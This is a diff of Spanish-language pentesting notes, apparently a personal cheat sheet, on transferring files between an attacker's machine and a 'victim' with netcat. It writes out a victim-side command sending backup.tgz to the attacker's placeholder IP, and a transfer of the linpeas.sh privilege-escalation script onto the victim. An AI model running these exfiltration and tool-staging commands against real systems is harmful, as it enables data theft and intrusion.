@@ -11,15 +11,27 @@ En máquina víctima recuerda pasarte a un directorio con permiso de escritura, 
 
 ---
 
-Para pasar archivo de máquina víctima a la mía:
+Con netcat. Para pasar archivo de máquina víctima a la mía.
+
+En mi máquina, usaremos el puerto 4448 por ejemplo:
 ```  
-> nc -nlvp <puerto> > backup.tgz  
-```
-Lo anterior en mi máquina.  
+> nc -nlvp 4448 > backup.tgz  
+```  
 Ahora desde la víctima:  
 ```
-> nc <miIp> <miPuerto> < <archivo>
+> nc MIIP 4448 < backup.tgz
 ```
+Siguiendo con netcat pero ahora al revés, para enviar de mi máquina a la víctima:
+
+En máquina víctima:
+```
+> nc -nlvp 4448 > linpeas.sh
+```
+En mi máquina:
+```
+> nc IPVICTIMA 4448 < linpeas.sh
+```
+
 -----------------
 Ahora desde servidor **python**:  
 Me creo servidor  
